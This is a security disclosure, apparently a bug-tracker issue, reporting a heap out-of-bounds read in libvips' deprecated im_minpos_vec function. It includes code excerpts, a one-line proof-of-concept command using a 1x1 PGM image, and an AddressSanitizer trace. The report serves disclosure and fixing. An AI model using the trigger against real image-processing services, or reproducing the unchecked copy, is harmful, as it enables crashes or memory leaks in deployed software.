## Heap Buffer Overflow (OOB Read) in `im_minpos_vec` — `memcpy` reads past end of array returned by `vips_min`

### Summary

An Out-of-Bounds memory access vulnerability exists in `im_minpos_vec()` in `libvips/deprecated/vips7compat.c`. `im_minpos_vec()` calls `vips_min()` requesting `n` minimum positions, then unconditionally copies `n` elements from the returned arrays. However, `vips_min` sizes its output arrays to the **actual number of pixels scanned** (`values->n`), not the requested count (`n`). When the image contains fewer pixels than `n`, the returned arrays are smaller than `n` elements and the `memcpy` reads past the end of the heap buffer.

### Affected Component

- **File:** `libvips/deprecated/vips7compat.c`
- **Function:** `im_minpos_vec()`
- **Lines:** 4220–4222

### Env
- OS: Ubuntu 25.10, aarch64                                                                         
- Vips: 8.19.0

### Root Cause

`im_minpos_vec` calls `vips_min` with `"size", n` and then blindly copies `n` elements:

```c
// vips7compat.c:4220-4222
memcpy(xpos,   VIPS_ARRAY_ADDR(x_array,   0), n * sizeof(int));
memcpy(ypos,   VIPS_ARRAY_ADDR(y_array,   0), n * sizeof(int));
memcpy(minima, VIPS_ARRAY_ADDR(out_array, 0), n * sizeof(double));
```

Inside `vips_min_build` (`arithmetic/min.c`), the output arrays are allocated to hold the **actual** number of values found (`values->n`), not the requested `n`:

```c
// arithmetic/min.c — vips_min_build
out_array = vips_array_double_new(values->value, values->n);  // actual count
x_array   = vips_array_int_new(values->x_pos,   values->n);  // NOT n
y_array   = vips_array_int_new(values->y_pos,   values->n);  // NOT n
```

`values->n` is the number of pixels scanned, capped at `values->size` (= `n`). When the image has **fewer pixels than `n`**, `values->n < n`, the allocated arrays are undersized, and the `memcpy` of `n * sizeof(int)` bytes reads out of bounds.

### Proof-of-concept

PGM file: poc_1x1.pgm

```sh
./build_asan/tools/vips im_minpos_vec poc_1x1.pgm 100
```

### AddressSanitizer Output

```
=================================================================
==18345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xe62a33847fd4 at pc 0xea0a37cb7f5c bp 0xffffd85a7a70 sp 0xffffd85a7250
READ of size 400 at 0xe62a33847fd4 thread T0
    #0 0xea0a37cb7f58 in memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:115
    #1 0xea0a365dde34 in im_minpos_vec (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0xc0de34) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #2 0xea0a3654955c in minpos_vec_vec (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0xb7955c) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #3 0xea0a365ef7cc in im_run_command (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0xc1f7cc) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #4 0xc021d16bbdc8 in main (/home/roo/Desktop/libvips/libvips/build_asan/tools/vips+0xbdc8) (BuildId: ddf7ab32648321cd58aa6aaf899f195a34a6ed45)
    #5 0xea0a34f72598 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #6 0xea0a34f72678 in __libc_start_main_impl ../csu/libc-start.c:360
    #7 0xc021d16bddec in _start (/home/roo/Desktop/libvips/libvips/build_asan/tools/vips+0xddec) (BuildId: ddf7ab32648321cd58aa6aaf899f195a34a6ed45)

0xe62a33847fd4 is located 0 bytes after 4-byte region [0xe62a33847fd0,0xe62a33847fd4)
allocated by thread T0 here:
    #0 0xea0a37cba578 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:67
    #1 0xea0a358b60a0 in g_malloc (/tmp/local/usr/lib/aarch64-linux-gnu/libglib-2.0.so.0+0x660a0) (BuildId: fc05fc2e288d11b5326ef462afdd3a7f9ab8d00c)
    #2 0xea0a36a78034 in vips_area_new_array (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0x10a8034) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #3 0xea0a36a79174 in vips_array_int_new (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0x10a9174) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #4 0xea0a366d420c in vips_min_build (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0xd0420c) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #5 0xea0a36a8691c in vips_object_build (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0x10b691c) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #6 0xea0a36ab3490 in vips_cache_operation_buildp (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0x10e3490) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #7 0xea0a36ad6234 in vips_call_required_optional (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0x1106234) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #8 0xea0a36ada018 in vips_call_split (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0x110a018) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #9 0xea0a366d4c10 in vips_min (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0xd04c10) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #10 0xea0a365ddddc in im_minpos_vec (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0xc0dddc) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #11 0xea0a3654955c in minpos_vec_vec (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0xb7955c) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #12 0xea0a365ef7cc in im_run_command (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0xc1f7cc) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e)
    #13 0xc021d16bbdc8 in main (/home/roo/Desktop/libvips/libvips/build_asan/tools/vips+0xbdc8) (BuildId: ddf7ab32648321cd58aa6aaf899f195a34a6ed45)
    #14 0xea0a34f72598 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #15 0xea0a34f72678 in __libc_start_main_impl ../csu/libc-start.c:360
    #16 0xc021d16bddec in _start (/home/roo/Desktop/libvips/libvips/build_asan/tools/vips+0xddec) (BuildId: ddf7ab32648321cd58aa6aaf899f195a34a6ed45)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/roo/Desktop/libvips/libvips/build_asan/tools/../libvips/libvips.so.42+0xc0de34) (BuildId: 33579f819cf4b923ff5cefaf11cd12fc5fa8586e) in im_minpos_vec
Shadow bytes around the buggy address:
  0xe62a33847d00: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
  0xe62a33847d80: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
  0xe62a33847e00: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
  0xe62a33847e80: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
  0xe62a33847f00: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
=>0xe62a33847f80: fa fa fd fd fa fa 00 fa fa fa[04]fa fa fa 04 fa
  0xe62a33848000: fa fa fd fd fa fa 00 00 fa fa 00 00 fa fa fd fd
  0xe62a33848080: fa fa fd fd fa fa fd fa fa fa fd fd fa fa fd fd
  0xe62a33848100: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fd
  0xe62a33848180: fa fa fd fd fa fa fd fa fa fa fd fd fa fa fd fd
  0xe62a33848200: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==18345==ABORTING

```


